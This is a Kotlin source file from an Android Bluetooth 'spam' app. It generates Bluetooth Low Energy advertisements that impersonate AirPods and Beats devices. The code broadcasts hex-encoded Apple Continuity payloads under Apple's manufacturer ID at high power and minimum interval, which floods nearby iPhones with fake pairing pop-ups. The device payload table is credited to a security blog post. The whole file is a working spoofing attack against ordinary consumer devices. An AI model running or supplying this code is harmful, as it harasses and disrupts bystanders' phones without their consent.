package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSetParameters
import android.util.Log
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Callbacks.GoogleFastPairAdvertisingCallback
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import de.simon.dankelmann.bluetoothlespam.Models.ManufacturerSpecificDataModel

class ContinuityDevicePopUpAdvertisementSetGenerator: IAdvertisementSetGenerator {

    private val _logTag = "ContinuityAdvertisementSetGenerator"

    // Device Data taken from here:
    // https://www.mobile-hacker.com/2023/09/07/spoof-ios-devices-with-bluetooth-pairing-messages-using-android/

    val _deviceData = mapOf(
        "Airpods" to "071907022075aa3001000045121212000000000000000000000000",
        "Airpods Pro" to "0719070e2075aa3001000045121212000000000000000000000000",
        "Airpods Max" to "0719070a2075aa3001000045121212000000000000000000000000",
        "Airpods Gen 2" to "0719070f2075aa3001000045121212000000000000000000000000",
        "Airpods Gen 3" to "071907132075aa3001000045121212000000000000000000000000",
        "Airpods Pro Gen 2" to "071907142075aa3001000045121212000000000000000000000000",
        "PowerBeats" to "071907032075aa3001000045121212000000000000000000000000",
        "PowerBeats Pro" to "0719070b2075aa3001000045121212000000000000000000000000",
        "Beats Solo Pro" to "0719070c2075aa3001000045121212000000000000000000000000",
        "Beats Studio Buds" to "071907112075aa3001000045121212000000000000000000000000",
        "Beats Flex" to "071907102075aa3001000045121212000000000000000000000000",
        "BeatsX" to "071907052075aa3001000045121212000000000000000000000000",
        "Beats Solo3" to "071907062075aa3001000045121212000000000000000000000000",
        "Beats Studio3" to "071907092075aa3001000045121212000000000000000000000000",
        "Beats Studio Pro" to "071907172075aa3001000045121212000000000000000000000000",
        "Beats Fit Pro" to "071907122075aa3001000045121212000000000000000000000000",
        "Beats Studio Buds+" to "071907162075aa3001000045121212000000000000000000000000"
    )

    private val _manufacturerId = 76 // 0x004c == 76 = Apple
    override fun getAdvertisementSets(): List<AdvertisementSet> {
        var advertisementSets:MutableList<AdvertisementSet> = mutableListOf()

        _deviceData.map {deviceData ->

            var advertisementSet:AdvertisementSet = AdvertisementSet()

            // Advertise Settings
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = AdvertiseSettings.ADVERTISE_TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = false
            advertisementSet.advertiseSettings.timeout = 0

            // Advertising Parameters
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
            advertisementSet.advertisingSetParameters.txPowerLevel = AdvertisingSetParameters.TX_POWER_HIGH
            advertisementSet.advertisingSetParameters.primaryPhy = BluetoothDevice.PHY_LE_1M
            advertisementSet.advertisingSetParameters.secondaryPhy = BluetoothDevice.PHY_LE_1M
            advertisementSet.advertisingSetParameters.scannable = false

            // AdvertiseData
            advertisementSet.advertiseData.includeDeviceName = false

            val manufacturerSpecificData = ManufacturerSpecificDataModel()
            manufacturerSpecificData.manufacturerId = _manufacturerId
            manufacturerSpecificData.manufacturerSpecificData = StringHelpers.decodeHex(deviceData.value)

            advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
            advertisementSet.advertiseData.includeTxPower = false

            // Scan Response
            advertisementSet.scanResponse.includeTxPower = false

            // General Data
            advertisementSet.deviceName = deviceData.key

            // Callbacks
            advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GoogleFastPairAdvertisingCallback()

            advertisementSets.add(advertisementSet)
        }

        return advertisementSets.toList()
    }

}